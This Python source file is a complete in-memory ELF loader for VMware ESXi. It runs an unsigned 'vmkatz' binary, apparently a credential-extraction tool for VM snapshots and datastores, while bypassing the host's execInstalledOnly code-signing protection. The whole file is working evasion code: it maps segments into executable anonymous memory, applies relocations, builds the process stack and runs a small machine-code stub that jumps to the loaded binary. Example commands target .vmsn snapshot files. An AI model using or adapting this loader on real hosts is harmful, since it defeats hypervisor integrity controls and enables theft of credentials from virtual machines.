#!/usr/bin/env python
"""
vmkatz in-memory ELF loader for ESXi.

Bypasses execInstalledOnly (VIB protection) by loading the vmkatz static
binary into anonymous mmap pages with PROT_EXEC. ESXi VMkernel allows
PROT_EXEC on anonymous mappings but blocks execve on unsigned binaries.

Python is included in ESXi 6.x+ and executes regardless of VIB settings.

We parse the ELF, map segments, apply relocations, build a proper
initial stack (argc/argv/envp/auxv), and jump to _start.

Compatible with Python 2.7+ (ESXi 6.5) through 3.11+ (ESXi 8.0).

Usage:
    python /tmp/vmkatz_loader.py /tmp/vmkatz [vmkatz-args...]

Example:
    python /tmp/vmkatz_loader.py /tmp/vmkatz /vmfs/volumes/datastore1/VM/snapshot.vmsn
    python /tmp/vmkatz_loader.py /tmp/vmkatz --vmfs-list
"""

import ctypes
import ctypes.util
import os
import struct
import sys

# ── ELF constants ───────────────────────────────────────────────────

ELF_MAGIC = b'\x7fELF'
ELFCLASS64 = 2
ELFDATA2LSB = 1
ET_DYN = 3
PT_LOAD = 1
PT_DYNAMIC = 2

DT_NULL = 0
DT_RELA = 7
DT_RELASZ = 8
DT_RELAENT = 9
R_X86_64_RELATIVE = 8

PF_X, PF_W, PF_R = 1, 2, 4

# ── mmap / aux constants ────────────────────────────────────────────

PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
MAP_PRIVATE = 0x02
MAP_ANONYMOUS = 0x20
MAP_FIXED = 0x10

PAGE_SIZE = 0x1000
PAGE_MASK = PAGE_SIZE - 1

AT_NULL = 0
AT_PHDR = 3
AT_PHENT = 4
AT_PHNUM = 5
AT_PAGESZ = 6
AT_BASE = 7
AT_ENTRY = 9
AT_RANDOM = 25

LOAD_BASE = 0x10000000
STACK_SIZE = 8 * 1024 * 1024

# ── Helpers ─────────────────────────────────────────────────────────

def page_down(addr):
    return addr & ~PAGE_MASK

def page_up(size):
    return (size + PAGE_MASK) & ~PAGE_MASK

def get_libc():
    libc = ctypes.CDLL(ctypes.util.find_library('c') or 'libc.so.6', use_errno=True)
    libc.mmap.restype = ctypes.c_void_p
    libc.mmap.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
        ctypes.c_int, ctypes.c_int, ctypes.c_long
    ]
    return libc

def w64(addr, val):
    ctypes.memmove(addr, struct.pack('<Q', val & 0xFFFFFFFFFFFFFFFF), 8)

# ── ELF parsing ─────────────────────────────────────────────────────

def parse_elf64(data):
    assert data[:4] == ELF_MAGIC, "Not an ELF file"
    assert data[4] == ELFCLASS64, "Not ELF64"
    assert data[5] == ELFDATA2LSB, "Not little-endian"

    e_type = struct.unpack_from('<H', data, 16)[0]
    e_entry = struct.unpack_from('<Q', data, 24)[0]
    e_phoff = struct.unpack_from('<Q', data, 32)[0]
    e_phentsize = struct.unpack_from('<H', data, 54)[0]
    e_phnum = struct.unpack_from('<H', data, 56)[0]

    segments = []
    dyn_off = None
    dyn_sz = None

    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from('<I', data, off)[0]
        p_flags = struct.unpack_from('<I', data, off + 4)[0]
        p_offset = struct.unpack_from('<Q', data, off + 8)[0]
        p_vaddr = struct.unpack_from('<Q', data, off + 16)[0]
        p_filesz = struct.unpack_from('<Q', data, off + 32)[0]
        p_memsz = struct.unpack_from('<Q', data, off + 40)[0]

        if p_type == PT_DYNAMIC:
            dyn_off = p_offset
            dyn_sz = p_filesz

        if p_type == PT_LOAD:
            prot = 0
            if p_flags & PF_R: prot |= PROT_READ
            if p_flags & PF_W: prot |= PROT_WRITE
            if p_flags & PF_X: prot |= PROT_EXEC
            segments.append({
                'vaddr': p_vaddr, 'memsz': p_memsz, 'filesz': p_filesz,
                'offset': p_offset, 'prot': prot,
            })

    return (e_entry, segments, e_type == ET_DYN,
            dyn_off, dyn_sz, e_phoff, e_phentsize, e_phnum)

# ── Relocation ──────────────────────────────────────────────────────

def apply_relocations(data, base, dyn_off, dyn_sz):
    if dyn_off is None:
        return 0

    rela_addr = 0
    rela_size = 0
    rela_ent = 24

    off = dyn_off
    while off + 16 <= dyn_off + dyn_sz:
        tag = struct.unpack_from('<Q', data, off)[0]
        val = struct.unpack_from('<Q', data, off + 8)[0]
        if tag == DT_NULL:
            break
        elif tag == DT_RELA:
            rela_addr = val
        elif tag == DT_RELASZ:
            rela_size = val
        elif tag == DT_RELAENT:
            rela_ent = val
        off += 16

    if not rela_addr or not rela_size:
        return 0

    count = 0
    pos = rela_addr
    end = pos + rela_size
    while pos + 24 <= end and pos + 24 <= len(data):
        r_offset, r_info, r_addend = struct.unpack_from('<QQq', data, pos)
        if (r_info & 0xFFFFFFFF) == R_X86_64_RELATIVE:
            target = base + r_offset
            value = (base + r_addend) & 0xFFFFFFFFFFFFFFFF
            ctypes.memmove(target, struct.pack('<Q', value), 8)
            count += 1
        pos += rela_ent

    return count

# ── Load ELF ────────────────────────────────────────────────────────

def load_elf(libc, data, entry, segments, is_pie, dyn_off, dyn_sz):
    base = LOAD_BASE if is_pie else 0

    for seg in segments:
        vaddr = base + seg['vaddr']
        map_start = page_down(vaddr)
        map_size = page_up(vaddr + seg['memsz']) - map_start

        addr = libc.mmap(
            ctypes.c_void_p(map_start), map_size,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
            -1, 0
        )
        if addr == ctypes.c_void_p(-1).value:
            errno = ctypes.get_errno()
            raise OSError("mmap failed at 0x%x: errno %d" % (map_start, errno))

        if seg['filesz'] > 0:
            src = data[seg['offset']:seg['offset'] + seg['filesz']]
            ctypes.memmove(vaddr, src, len(src))

    if is_pie and dyn_off is not None:
        n = apply_relocations(data, base, dyn_off, dyn_sz)
        sys.stderr.write("[*] Applied %d relocations\n" % n)

    return base + entry, base

# ── Stack builder ───────────────────────────────────────────────────

def build_stack(libc, argv, envp, auxv):
    stack_base = libc.mmap(
        None, STACK_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1, 0
    )
    if stack_base == ctypes.c_void_p(-1).value:
        raise OSError("Failed to allocate stack")

    stack_top = stack_base + STACK_SIZE

    # Write strings near top
    str_pos = [stack_top - 0x10000]  # mutable via list for py3.5 compat

    def put_str(s):
        if isinstance(s, str):
            b = s.encode('utf-8') + b'\0'
        else:
            b = s + b'\0'
        ctypes.memmove(str_pos[0], b, len(b))
        ptr = str_pos[0]
        str_pos[0] += len(b)
        return ptr

    argv_ptrs = [put_str(a) for a in argv]
    envp_ptrs = [put_str(e) for e in envp]

    # 16 random bytes for AT_RANDOM
    random_ptr = str_pos[0]
    random_bytes = os.urandom(16)
    ctypes.memmove(str_pos[0], random_bytes, 16)
    str_pos[0] += 16

    # Build stack frame
    n_auxv = len(auxv) + 1  # +1 for AT_RANDOM
    frame_qwords = 1 + len(argv_ptrs) + 1 + len(envp_ptrs) + 1 + (n_auxv + 1) * 2
    frame_size = frame_qwords * 8
    str_area = stack_top - 0x10000
    sp = (str_area - frame_size) & ~0xF

    pos = sp
    w64(pos, len(argv_ptrs)); pos += 8
    for p in argv_ptrs:
        w64(pos, p); pos += 8
    w64(pos, 0); pos += 8
    for p in envp_ptrs:
        w64(pos, p); pos += 8
    w64(pos, 0); pos += 8

    for tag, val in auxv:
        w64(pos, tag); pos += 8
        w64(pos, val); pos += 8
    w64(pos, AT_RANDOM); pos += 8
    w64(pos, random_ptr); pos += 8
    w64(pos, 0); pos += 8
    w64(pos, 0); pos += 8

    return sp

# ── Jump to entry ───────────────────────────────────────────────────

def jump_to_entry(libc, sp, entry):
    code = bytes(bytearray([
        0x48, 0x89, 0xfc,  # mov rsp, rdi
        0x48, 0x31, 0xd2,  # xor rdx, rdx
        0x48, 0x31, 0xed,  # xor rbp, rbp
        0xff, 0xe6,         # jmp rsi
    ]))

    page = libc.mmap(
        None, PAGE_SIZE,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1, 0
    )
    ctypes.memmove(page, code, len(code))

    fn = ctypes.CFUNCTYPE(None, ctypes.c_uint64, ctypes.c_uint64)(page)
    fn(sp, entry)

# ── Main ────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        sys.stderr.write("Usage: python3 %s <vmkatz-binary> [vmkatz-args...]\n" % sys.argv[0])
        sys.stderr.write("\nIn-memory ELF loader for vmkatz on ESXi (bypasses execInstalledOnly).\n")
        sys.exit(1)

    binary_path = sys.argv[1]
    vmkatz_argv = sys.argv[1:]

    with open(binary_path, 'rb') as f:
        elf_data = f.read()

    sys.stderr.write("[*] Loading %s (%.1f MB)\n" % (binary_path, len(elf_data) / (1024.0 * 1024.0)))

    entry, segments, is_pie, dyn_off, dyn_sz, phoff, phent, phnum = parse_elf64(elf_data)

    sys.stderr.write("[*] ELF: %s, entry=0x%x, %d segments\n" % (
        'PIE' if is_pie else 'static', entry, len(segments)))

    libc = get_libc()

    actual_entry, base = load_elf(libc, elf_data, entry, segments, is_pie, dyn_off, dyn_sz)

    sys.stderr.write("[*] Loaded at 0x%x, entry=0x%x\n" % (base, actual_entry))

    auxv = [
        (AT_PAGESZ, PAGE_SIZE),
        (AT_PHDR, base + phoff),
        (AT_PHENT, phent),
        (AT_PHNUM, phnum),
        (AT_ENTRY, actual_entry),
        (AT_BASE, 0),
    ]

    envp = ["%s=%s" % (k, v) for k, v in os.environ.items()]
    sp = build_stack(libc, vmkatz_argv, envp, auxv)

    sys.stdout.flush()
    sys.stderr.flush()

    jump_to_entry(libc, sp, actual_entry)


if __name__ == '__main__':
    main()
